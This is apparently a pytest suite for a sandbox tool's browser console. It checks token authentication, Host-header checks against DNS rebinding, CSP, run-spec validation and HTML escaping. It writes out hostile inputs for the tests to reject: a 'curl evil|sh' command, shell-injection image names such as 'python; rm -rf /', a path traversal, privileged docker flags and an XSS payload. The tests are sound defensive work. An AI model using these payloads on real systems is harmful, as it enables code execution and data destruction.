"""The console's trust boundary, asserted.

A browser front end for a sandbox tool is a way to hand a web page the power to
launch containers. These tests pin the bounds of that power.
"""
import http.client
import json
import os
import re

import pytest

from agentsec.ui import render_html
from agentsec.ui.server import ALLOWED_FLAGS, serve, validate_run

HERE = os.path.dirname(os.path.abspath(__file__))
REPO = os.path.dirname(HERE)


@pytest.fixture(scope="module")
def console():
    httpd, con, port = serve(port=0, results=[], forever=False)
    yield con, port
    httpd.shutdown()
    httpd.server_close()


def call(port, method, path, body=None, token=None, host=None):
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    headers = {}
    if token:
        headers["X-Agentsec-Token"] = token
    if body is not None:
        headers["Content-Type"] = "application/json"
    if host:
        headers["Host"] = host
    c.request(method, path, json.dumps(body) if body is not None else None, headers)
    r = c.getresponse()
    data = r.read()
    c.close()
    return r.status, data


# -- authentication and origin -----------------------------------------
def test_api_refuses_a_request_with_no_token(console):
    con, port = console
    status, _ = call(port, "GET", "/api/results")
    assert status == 401


def test_api_refuses_a_wrong_token(console):
    con, port = console
    status, _ = call(port, "GET", "/api/results", token="not-the-token")
    assert status == 401


def test_api_accepts_the_real_token(console):
    con, port = console
    status, data = call(port, "GET", "/api/results", token=con.token)
    assert status == 200
    assert "results" in json.loads(data)


def test_a_foreign_host_header_is_refused(console):
    """DNS rebinding: a hostile page resolving its own name to 127.0.0.1."""
    con, port = console
    status, _ = call(port, "GET", "/api/results", token=con.token, host="evil.example.com")
    assert status == 400
    status, _ = call(port, "GET", "/", host="evil.example.com")
    assert status == 400


def test_the_page_itself_needs_no_token_but_the_api_does(console):
    con, port = console
    status, body = call(port, "GET", "/")
    assert status == 200 and b"<!doctype html>" in body.lower()


def test_responses_carry_a_restrictive_csp(console):
    con, port = console
    c = http.client.HTTPConnection("127.0.0.1", port, timeout=10)
    c.request("GET", "/")
    r = c.getresponse()
    csp = r.getheader("Content-Security-Policy")
    r.read(); c.close()
    assert "default-src 'self'" in csp
    assert "frame-ancestors 'none'" in csp
    assert r.getheader("Access-Control-Allow-Origin") is None


# -- the run surface ----------------------------------------------------
def test_the_browser_cannot_ask_for_a_command_template():
    """The one thing that must never be reachable from a web page."""
    for spec in ({"command": "bash -c 'curl evil|sh'"},
                 {"template": "bwrap {probe}"},
                 {"kind": "command", "template": "sh -c id"}):
        with pytest.raises(ValueError):
            validate_run(spec)


def test_unknown_preset_is_refused():
    with pytest.raises(ValueError):
        validate_run({"preset": "../../etc/passwd"})
    with pytest.raises(ValueError):
        validate_run({"preset": "no-such-preset"})


def test_a_shipped_preset_is_accepted():
    assert validate_run({"preset": "docker-hardened"})["preset"] == "docker-hardened"


def test_image_names_that_could_reach_a_shell_are_refused():
    for bad in ["python; rm -rf /", "python && id", "$(whoami)", "a|b", "-v/:/host", ""]:
        with pytest.raises(ValueError):
            validate_run({"engine": "docker", "image": bad, "flags": []})


def test_only_recommended_flags_are_accepted():
    assert validate_run({"engine": "docker", "image": "python:3.12-slim",
                         "flags": ["--network none"]})["flags"] == ["--network none"]
    with pytest.raises(ValueError):
        validate_run({"engine": "docker", "image": "python:3.12-slim",
                      "flags": ["-v", "/:/host"]})
    with pytest.raises(ValueError):
        validate_run({"engine": "docker", "image": "python:3.12-slim",
                      "flags": ["--privileged"]})


def test_engine_is_restricted_to_two_known_ones():
    with pytest.raises(ValueError):
        validate_run({"engine": "sh", "image": "python:3.12-slim", "flags": []})


def test_run_endpoint_refuses_a_bad_spec_over_http(console):
    con, port = console
    status, data = call(port, "POST", "/api/run", {"command": "id"}, token=con.token)
    assert status == 400
    assert "command templates" in json.loads(data)["error"]


def test_privileged_flags_are_not_in_the_allowed_set():
    for bad in ("--privileged", "-v", "--pid=host", "--cap-add"):
        assert bad not in ALLOWED_FLAGS


# -- scoring a pasted capture -------------------------------------------
def test_score_endpoint_repairs_a_clipped_transcript(console):
    con, port = console
    with open(os.path.join(REPO, "examples", "agents",
                           "codex-cli-0.153.4-read-only.json")) as f:
        probe = json.load(f)["probe"]
    clipped = json.dumps(probe)[:-1]
    status, data = call(port, "POST", "/api/score",
                        {"label": "t", "how": "pasted", "probe": clipped}, token=con.token)
    assert status == 200
    out = json.loads(data)
    assert out["repaired"] is True
    assert out["result"]["summary"]["score"] >= 0


def test_score_endpoint_requires_provenance(console):
    con, port = console
    status, _ = call(port, "POST", "/api/score",
                     {"label": "", "how": "", "probe": "{}"}, token=con.token)
    assert status == 400


def test_score_endpoint_rejects_text_that_is_not_probe_json(console):
    con, port = console
    status, _ = call(port, "POST", "/api/score",
                     {"label": "t", "how": "h", "probe": "sorry, I could not run that"},
                     token=con.token)
    assert status == 400


# -- the page ------------------------------------------------------------
def test_the_page_loads_nothing_from_the_network():
    """A supply-chain argument the tool makes about others applies to itself."""
    html = render_html([])
    for attr in re.findall(r'(?:src|href)\s*=\s*"([^"]*)"', html):
        assert not attr.startswith(("http://", "https://", "//")), attr
    assert "cdn" not in html.lower().split("<script")[0]


def test_inlined_data_cannot_close_the_script_element():
    hostile = {"tool": "x", "summary": {"score": 1, "findings": [
        {"id": "X", "severity": "low", "category": "network", "title": "</script><img src=x onerror=alert(1)>",
         "evidence": {}, "owasp": [], "remediation": ""}], "finding_count": 1,
        "by_severity": {"critical": 0, "high": 0, "medium": 0, "low": 1, "info": 0}, "raw_score": 1},
        "probe": {}, "target": {}, "label": "x"}
    html = render_html([hostile])
    assert "</script><img" not in html
    assert "\\u003c/script" in html or "\\u003c/scr" in html


def test_static_and_server_modes_share_one_template():
    """One renderer, or the two pages drift and the shared one is the exported one."""
    import json as _json

    def payload(html):
        body = html.split('id="payload">', 1)[1].split("</script>", 1)[0]
        return _json.loads(body.replace("\\u003c", "<").replace("\\u003e", ">").replace("\\u0026", "&"))

    static, server = render_html([]), render_html([], mode="server", token="tok")
    assert payload(static)["mode"] == "static"
    assert payload(server)["mode"] == "server"
    assert payload(server)["token"] == "tok"
    assert payload(static)["token"] == ""
    # everything outside the data block is byte-identical
    assert static.split('id="payload">')[0] == server.split('id="payload">')[0]


# -- binding beyond loopback --------------------------------------------
def test_a_console_bound_off_box_refuses_to_launch_anything():
    """Viewing can be exposed; starting containers is a separate decision."""
    from agentsec.ui.server import Console, is_loopback
    assert is_loopback("127.0.0.1") and is_loopback("localhost") and is_loopback("::1")
    assert not is_loopback("192.168.1.10")
    httpd, con, port = serve(port=0, results=[], forever=False,
                             bind="127.0.0.1", allow_remote_runs=False)
    try:
        assert con.allow_runs is True  # loopback keeps its powers
    finally:
        httpd.shutdown(); httpd.server_close()
    remote = Console([], allow_runs=False)
    assert remote.allow_runs is False


def test_run_endpoint_is_403_when_runs_are_disabled():
    from agentsec.ui.server import Console, make_handler
    import http.server, threading
    con = Console([], allow_runs=False)
    httpd = http.server.ThreadingHTTPServer(("127.0.0.1", 0), None)
    port = httpd.server_address[1]
    httpd.RequestHandlerClass = make_handler(con, port)
    threading.Thread(target=httpd.serve_forever, daemon=True).start()
    try:
        status, data = call(port, "POST", "/api/run", {"preset": "docker-hardened"}, token=con.token)
        assert status == 403
        assert "--allow-remote-runs" in json.loads(data)["error"]
    finally:
        httpd.shutdown(); httpd.server_close()
